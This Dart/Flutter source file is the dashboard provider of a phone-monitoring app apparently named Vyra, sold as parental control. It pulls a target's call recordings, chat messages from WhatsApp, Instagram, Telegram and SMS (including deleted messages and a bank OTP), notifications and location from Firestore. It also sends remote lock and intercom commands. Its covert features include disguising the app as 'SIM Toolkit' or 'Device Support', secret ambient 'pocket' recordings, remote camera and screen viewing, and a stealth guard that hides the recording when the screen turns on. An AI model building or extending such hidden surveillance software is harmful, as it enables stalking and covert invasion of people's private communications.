import 'dart:async';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/foundation.dart';
import '../models/device_status.dart';
import '../models/child_profile.dart';
import '../models/call_record.dart';
import '../models/chat_message.dart';
import '../models/notification_item.dart';
import '../models/watchlist_target.dart';
import '../models/ambient_log_item.dart';

class ParentDashboardProvider extends ChangeNotifier {
  ParentDashboardProvider() {
    _initFirebaseListeners();
  }

  FirebaseFirestore? _firestore;
  StreamSubscription? _deviceSub;
  StreamSubscription? _callsSub;
  StreamSubscription? _chatsSub;
  StreamSubscription? _notifsSub;

  final List<ChildProfile> _children = [
    const ChildProfile(
      id: "child_1",
      name: "Aryan",
      deviceModel: "Vivo T3 Pro 5G",
      batteryLevel: 84,
      isOnline: true,
      locationAddress: "Near City Coaching Center, Sector 4",
      selectedDisguise: "SIM Toolkit",
    ),
    const ChildProfile(
      id: "child_2",
      name: "Ananya",
      deviceModel: "Samsung Galaxy M34",
      batteryLevel: 62,
      isOnline: true,
      locationAddress: "Home, Model Town",
      selectedDisguise: "Device Support",
    ),
  ];
  List<ChildProfile> get children => _children;

  String _activeChildId = "child_1";
  String get activeChildId => _activeChildId;

  ChildProfile get activeChild =>
      _children.firstWhere((c) => c.id == _activeChildId, orElse: () => _children.first);

  void switchChild(String childId) {
    _activeChildId = childId;
    _initFirebaseListeners();
    notifyListeners();
  }

  void _initFirebaseListeners() {
    try {
      _firestore ??= FirebaseFirestore.instance;
      _deviceSub?.cancel();
      _callsSub?.cancel();
      _chatsSub?.cancel();
      _notifsSub?.cancel();

      // 1. Listen to active child device telemetry
      _deviceSub = _firestore
          ?.collection('devices')
          .doc(_activeChildId)
          .snapshots()
          .listen((snapshot) {
        if (snapshot.exists && snapshot.data() != null) {
          final data = snapshot.data()!;
          final idx = _children.indexWhere((c) => c.id == _activeChildId);
          if (idx != -1) {
            _children[idx] = ChildProfile(
              id: _activeChildId,
              name: data['name'] ?? _children[idx].name,
              deviceModel: data['deviceModel'] ?? _children[idx].deviceModel,
              batteryLevel: (data['batteryLevel'] as num?)?.toInt() ?? _children[idx].batteryLevel,
              isOnline: data['isOnline'] as bool? ?? _children[idx].isOnline,
              locationAddress: data['locationAddress'] ?? _children[idx].locationAddress,
              selectedDisguise: data['selectedDisguise'] ?? _children[idx].selectedDisguise,
            );
            notifyListeners();
          }
        }
      }, onError: (e) => debugPrint("Device stream info: $e"));

      // 2. Listen to call records
      _callsSub = _firestore
          ?.collection('calls')
          .doc(_activeChildId)
          .collection('records')
          .orderBy('timestamp', descending: true)
          .snapshots()
          .listen((snapshot) {
        if (snapshot.docs.isNotEmpty) {
          final realRecords = snapshot.docs.map((doc) {
            final d = doc.data();
            DateTime dt = DateTime.now();
            if (d['timestamp'] is Timestamp) {
              dt = (d['timestamp'] as Timestamp).toDate();
            }
            return CallRecord(
              id: doc.id,
              contactName: d['contactName'] ?? 'Unknown',
              phoneNumber: d['phoneNumber'] ?? '',
              callType: (d['callType'] == 'outgoing') ? CallType.outgoing : CallType.incoming,
              timestamp: dt,
              durationSeconds: (d['durationSeconds'] as num?)?.toInt() ?? 0,
              recordingUrl: d['recordingUrl'],
              recordingDurationSeconds: (d['durationSeconds'] as num?)?.toInt() ?? 0,
              isTamperAttemptDetected: d['isTamperAttemptDetected'] as bool? ?? false,
              isWatchlistTarget: d['isWatchlistTarget'] as bool? ?? false,
            );
          }).toList();

          _callRecords.clear();
          _callRecords.addAll(realRecords);
          notifyListeners();
        }
      }, onError: (e) => debugPrint("Calls stream info: $e"));

      // 3. Listen to chats
      _chatsSub = _firestore
          ?.collection('chats')
          .doc(_activeChildId)
          .collection('messages')
          .orderBy('timestamp', descending: true)
          .snapshots()
          .listen((snapshot) {
        if (snapshot.docs.isNotEmpty) {
          final realMsgs = snapshot.docs.map((doc) {
            final d = doc.data();
            DateTime dt = DateTime.now();
            if (d['timestamp'] is Timestamp) {
              dt = (d['timestamp'] as Timestamp).toDate();
            }
            AppType app = AppType.whatsApp;
            final appStr = (d['app'] ?? '').toString().toLowerCase();
            if (appStr.contains('insta')) app = AppType.instagram;
            if (appStr.contains('tele')) app = AppType.telegram;
            if (appStr.contains('sms')) app = AppType.sms;

            return ChatMessage(
              id: doc.id,
              appType: app,
              contactName: d['sender'] ?? 'Unknown',
              contactIdentifier: d['sender'] ?? '',
              messageText: d['text'] ?? '',
              timestamp: dt,
              isIncoming: true,
              isDeletedBackup: d['isDeletedBySender'] as bool? ?? false,
              isWatchlistTarget: d['isWatchlistTarget'] as bool? ?? false,
            );
          }).toList();

          _chatMessages.clear();
          _chatMessages.addAll(realMsgs);
          notifyListeners();
        }
      }, onError: (e) => debugPrint("Chats stream info: $e"));
    } catch (e) {
      debugPrint("Firestore listener offline/fallback: $e");
    }
  }

  void sendVoiceIntercom(String announcement) {
    debugPrint("Broadcasting voice intercom to ${activeChild.name}: $announcement");
    try {
      _firestore?.collection('devices').doc(_activeChildId).collection('commands').add({
        'action': 'LOUDSPEAKER_INTERCOM',
        'payload': {'announcement': announcement},
        'status': 'PENDING',
        'timestamp': FieldValue.serverTimestamp(),
      });
    } catch (e) {
      debugPrint("Could not dispatch voice intercom to cloud: $e");
    }
  }

  final DeviceStatus _deviceStatus = DeviceStatus.sample();
  DeviceStatus get deviceStatus => _deviceStatus;

  bool _isPhoneLocked = false;
  bool get isPhoneLocked => _isPhoneLocked;

  bool _isLiveScreenActive = false;
  bool get isLiveScreenActive => _isLiveScreenActive;

  bool _isRemoteCameraActive = false;
  bool get isRemoteCameraActive => _isRemoteCameraActive;

  bool _isFlashlightOn = false;
  bool get isFlashlightOn => _isFlashlightOn;

  bool _isStealthScreenGuardEnabled = true; // Auto-cut camera/mic when child turns on screen
  bool get isStealthScreenGuardEnabled => _isStealthScreenGuardEnabled;

  void toggleStealthScreenGuard() {
    _isStealthScreenGuardEnabled = !_isStealthScreenGuardEnabled;
    try {
      _firestore?.collection('devices').doc(_activeChildId).collection('commands').add({
        'action': 'SET_STEALTH_GUARD',
        'payload': {'enabled': _isStealthScreenGuardEnabled},
        'status': 'PENDING',
        'timestamp': FieldValue.serverTimestamp(),
      });
    } catch (e) {
      debugPrint("Could not dispatch stealth guard command: $e");
    }
    notifyListeners();
  }

  String _currentCameraLens = "back"; // "back" or "front"
  String get currentCameraLens => _currentCameraLens;

  String? _currentlyPlayingAudioId;
  String? get currentlyPlayingAudioId => _currentlyPlayingAudioId;

  // Selected App tab in Chats screen
  AppType _selectedChatApp = AppType.whatsApp;
  AppType get selectedChatApp => _selectedChatApp;

  // Call Records
  final List<CallRecord> _callRecords = [
    CallRecord(
      id: "call_1",
      contactName: "Unknown (+91 98765 43210)",
      phoneNumber: "+919876543210",
      callType: CallType.incoming,
      timestamp: DateTime.now().subtract(const Duration(minutes: 25)),
      durationSeconds: 342, // 5 min 42 sec
      recordingUrl: "mock_recording_1.m4a",
      recordingDurationSeconds: 342,
      isTamperAttemptDetected: true, // Child attempted to stop recording!
      isWatchlistTarget: true,
    ),
    CallRecord(
      id: "call_2",
      contactName: "Rohan (School)",
      phoneNumber: "+919123456780",
      callType: CallType.outgoing,
      timestamp: DateTime.now().subtract(const Duration(hours: 3)),
      durationSeconds: 110,
      recordingUrl: "mock_recording_2.m4a",
      recordingDurationSeconds: 110,
      isTamperAttemptDetected: false,
    ),
    CallRecord(
      id: "call_3",
      contactName: "Coaching Center",
      phoneNumber: "+919988776655",
      callType: CallType.incoming,
      timestamp: DateTime.now().subtract(const Duration(hours: 7)),
      durationSeconds: 45,
      recordingUrl: "mock_recording_3.m4a",
      recordingDurationSeconds: 45,
      isTamperAttemptDetected: false,
    ),
  ];
  List<CallRecord> get callRecords => _callRecords;

  // Ambient Soundbites & Voice Activity Logs (Screen-Off Pocket Recordings)
  final List<AmbientLogItem> _ambientLogs = [
    AmbientLogItem(
      id: "ambient_1",
      timestamp: DateTime.now().subtract(const Duration(hours: 1, minutes: 20)),
      durationSeconds: 192,
      audioUrl: "mock_ambient_1.m4a",
      locationContext: "Near City Coaching Center, Sector 4",
      speechSnippet: "Discussion about practical files and plans after class.",
      isFlagged: true,
      detectedKeyword: "bunk",
    ),
    AmbientLogItem(
      id: "ambient_2",
      timestamp: DateTime.now().subtract(const Duration(hours: 3, minutes: 45)),
      durationSeconds: 285,
      audioUrl: "mock_ambient_2.m4a",
      locationContext: "Cafeteria / Market Area",
      speechSnippet: "Whispering conversation about meeting near metro gate.",
      isFlagged: true,
      detectedKeyword: "secret",
    ),
    AmbientLogItem(
      id: "ambient_3",
      timestamp: DateTime.now().subtract(const Duration(hours: 6)),
      durationSeconds: 150,
      audioUrl: "mock_ambient_3.m4a",
      locationContext: "Coaching Gate 2",
      speechSnippet: "Group laughter and discussion on homework notes.",
      isFlagged: false,
    ),
  ];
  List<AmbientLogItem> get ambientLogs => _ambientLogs;

  // Chat Messages
  final List<ChatMessage> _chatMessages = [
    // WhatsApp
    ChatMessage(
      id: "msg_w1",
      appType: AppType.whatsApp,
      contactName: "Unknown (+91 98765 43210)",
      contactIdentifier: "+919876543210",
      messageText: "Bhai kal jo baat hui thi kisi ko mat batana.",
      timestamp: DateTime.now().subtract(const Duration(minutes: 15)),
      isIncoming: true,
      isDeletedBackup: true, // Deleted for everyone, but captured by Vyra!
      isWatchlistTarget: true,
    ),
    ChatMessage(
      id: "msg_w2",
      appType: AppType.whatsApp,
      contactName: "Unknown (+91 98765 43210)",
      contactIdentifier: "+919876543210",
      messageText: "Haan theek hai, delete kar diya na tune?",
      timestamp: DateTime.now().subtract(const Duration(minutes: 14)),
      isIncoming: false,
      isWatchlistTarget: true,
    ),
    ChatMessage(
      id: "msg_w3",
      appType: AppType.whatsApp,
      contactName: "Rohan",
      contactIdentifier: "+919123456780",
      messageText: "Chemistry practical ki file kab submit karni hai?",
      timestamp: DateTime.now().subtract(const Duration(hours: 2)),
      isIncoming: true,
    ),
    // Instagram
    ChatMessage(
      id: "msg_i1",
      appType: AppType.instagram,
      contactName: "Priya Sharma",
      contactIdentifier: "@priya_sharma04",
      messageText: "Did you finish the assignment yet?",
      timestamp: DateTime.now().subtract(const Duration(hours: 1)),
      isIncoming: true,
    ),
    ChatMessage(
      id: "msg_i2",
      appType: AppType.instagram,
      contactName: "Rohan",
      contactIdentifier: "@rohan_speed",
      messageText: "Check out this reel haha",
      timestamp: DateTime.now().subtract(const Duration(hours: 4)),
      isIncoming: true,
    ),
    // Telegram
    ChatMessage(
      id: "msg_t1",
      appType: AppType.telegram,
      contactName: "Physics Study Group",
      contactIdentifier: "@physics_12th",
      messageText: "Notes for Chapter 4 uploaded on Google Drive.",
      timestamp: DateTime.now().subtract(const Duration(hours: 5)),
      isIncoming: true,
    ),
    // SMS
    ChatMessage(
      id: "msg_s1",
      appType: AppType.sms,
      contactName: "SBI Banking",
      contactIdentifier: "VK-SBIINB",
      messageText: "OTP for your transaction is 492019. Valid for 10 mins. Do not share with anyone.",
      timestamp: DateTime.now().subtract(const Duration(minutes: 45)),
      isIncoming: true,
    ),
  ];
  List<ChatMessage> get chatMessages => _chatMessages;

  // Notification Items
  final List<NotificationItem> _notifications = [
    NotificationItem(
      id: "notif_1",
      packageName: "com.whatsapp",
      appName: "WhatsApp",
      title: "Unknown (+91 98765 43210)",
      message: "Bhai kal jo baat hui thi kisi ko mat batana.",
      timestamp: DateTime.now().subtract(const Duration(minutes: 15)),
      isDeletedBackup: true,
      isSensitiveAlert: true,
    ),
    NotificationItem(
      id: "notif_2",
      packageName: "com.instagram.android",
      appName: "Instagram",
      title: "@priya_sharma04",
      message: "Sent a message: Did you finish the assignment yet?",
      timestamp: DateTime.now().subtract(const Duration(hours: 1)),
    ),
    NotificationItem(
      id: "notif_3",
      packageName: "com.google.android.youtube",
      appName: "YouTube",
      title: "Science Explained",
      message: "New video: Quantum Physics for Beginners is now live!",
      timestamp: DateTime.now().subtract(const Duration(hours: 2)),
    ),
    NotificationItem(
      id: "notif_4",
      packageName: "com.android.mms",
      appName: "Messages (SMS)",
      title: "VK-SBIINB",
      message: "OTP for your transaction is 492019.",
      timestamp: DateTime.now().subtract(const Duration(minutes: 45)),
    ),
  ];
  List<NotificationItem> get notifications => _notifications;

  // Watchlist Targets
  final List<WatchlistTarget> _watchlistTargets = [
    WatchlistTarget(
      id: "target_1",
      name: "Unknown Caller / Contact",
      identifier: "+91 98765 43210",
      note: "Frequently calls late night and asks to delete messages.",
      isHighPriority: true,
      totalCalls: 4,
      totalChats: 18,
      lastInteracted: DateTime.now().subtract(const Duration(minutes: 15)),
    ),
  ];
  List<WatchlistTarget> get watchlistTargets => _watchlistTargets;

  void setSelectedChatApp(AppType app) {
    _selectedChatApp = app;
    notifyListeners();
  }

  void toggleLockPhone() {
    _isPhoneLocked = !_isPhoneLocked;
    if (_isPhoneLocked) {
      try {
        _firestore?.collection('devices').doc(_activeChildId).collection('commands').add({
          'action': 'LOCK_PHONE',
          'payload': {},
          'status': 'PENDING',
          'timestamp': FieldValue.serverTimestamp(),
        });
      } catch (e) {
        debugPrint("Could not dispatch lock command: $e");
      }
    }
    notifyListeners();
  }

  void toggleLiveScreen() {
    _isLiveScreenActive = !_isLiveScreenActive;
    if (_isLiveScreenActive) _isRemoteCameraActive = false;
    notifyListeners();
  }

  void toggleRemoteCamera() {
    _isRemoteCameraActive = !_isRemoteCameraActive;
    if (_isRemoteCameraActive) _isLiveScreenActive = false;
    notifyListeners();
  }

  void switchCameraLens() {
    _currentCameraLens = (_currentCameraLens == "back") ? "front" : "back";
    notifyListeners();
  }

  void toggleFlashlight() {
    _isFlashlightOn = !_isFlashlightOn;
    notifyListeners();
  }

  void togglePlayAudio(String callId) {
    if (_currentlyPlayingAudioId == callId) {
      _currentlyPlayingAudioId = null;
    } else {
      _currentlyPlayingAudioId = callId;
    }
    notifyListeners();
  }

  void addWatchlistTarget(String name, String identifier, String note) {
    _watchlistTargets.add(
      WatchlistTarget(
        id: "target_${DateTime.now().millisecondsSinceEpoch}",
        name: name,
        identifier: identifier,
        note: note,
        isHighPriority: true,
        totalCalls: 0,
        totalChats: 0,
        lastInteracted: DateTime.now(),
      ),
    );
    notifyListeners();
  }

  @override
  void dispose() {
    _deviceSub?.cancel();
    _callsSub?.cancel();
    _chatsSub?.cancel();
    _notifsSub?.cancel();
    super.dispose();
  }
}
